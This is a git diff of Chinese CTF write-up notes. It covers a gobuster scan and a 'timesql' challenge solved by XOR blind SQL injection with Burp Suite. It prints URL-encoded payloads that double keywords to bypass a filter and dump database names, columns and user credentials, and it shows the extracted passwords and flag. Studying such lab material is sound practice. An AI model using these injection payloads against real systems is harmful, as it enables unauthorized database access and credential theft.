@@ -1015,7 +1015,8 @@ gobuster进行目录扫描：
 扫到一个/bin目录，访问，拿到所需的BrainPan.exe：
 ![[Pasted image 20240311122616.png]]
 [嘤嘤嘤]timesql #SQL注入漏洞 时间/盲注
-题名写了timesql但是测试直接异或盲注他回显不一致，就用异或盲注，服务器太烂了，用时间盲注时间一大一小看不清结果
+题名写了timesql但是测试直接异或盲注他回显不一致，就用异或盲注，服务器太烂了，用时间盲注时间一大一小看不清结果。
+全程用bp做
 爆数据库名 为hazel
 ```
 username=admin'%20anandd%20subsubstrstr(database()%2c§1§%2c1)%3d'§2§'%20%23&password=114514
@@ -1036,11 +1037,13 @@ username=admin'%20anandd%20subsubstrstr((selselectect%20table_name%20frfromom%20
 username=admin'%20anandd%20subsubstrstr((selselectect%20group_concat(column_name)%20frfromom%20infoorrmation_schema.columns%20whwhereere%20table_name%3d'users'%20anandd%20table_schema%3ddatabase())%2c§1§%2c1)%20%3d%20'§i§'%20%23
 ```
 ![[Pasted image 20240328193336.png]]
-爆字段：
+爆字段(payload列表注意加上flag所需的字符)：
+```
+admin'%20anandd%20subsubstrstr((selselectect%20group_concat(id%2c%22%3a%22%2cusername%2c%22%3a%22%2cpasswoorrd%2c%22%3a%22)%20frfromom%20hazel.users)%2c§1§%2c1)%20%3d%20'§i§'%20%23
+```
 
-| id  | username | password                                                 |
-| --- | -------- | -------------------------------------------------------- |
-| 0   | admin    | admin666666                                              |
-| 1   | hazel    | [35]a4e83611[44]9932[49]4d30[54]a359[59]596ce4492a83[72] |
-| 1   | hazel    | {a4e83611-9932-4d30-a359-596ce4492a83}                   |
+| id  | username | password                                    |
+| --- | -------- | ------------------------------------------- |
+| 0   | admin    | admin666666                                 |
+| 1   | hazel    | hazel{d3f3bac6-3fe8-4e5e-8680-40a5b0003799} |
 
